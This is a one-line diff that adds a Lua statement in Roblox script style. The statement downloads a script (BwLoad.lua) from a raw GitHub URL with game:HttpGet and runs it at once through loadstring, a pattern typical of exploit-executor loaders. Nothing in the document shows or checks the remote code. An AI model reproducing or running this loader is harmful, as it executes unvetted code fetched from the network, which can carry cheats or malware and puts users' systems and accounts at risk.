@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hshshahshsh/CustomV4/main/BwLoad.lua"))()
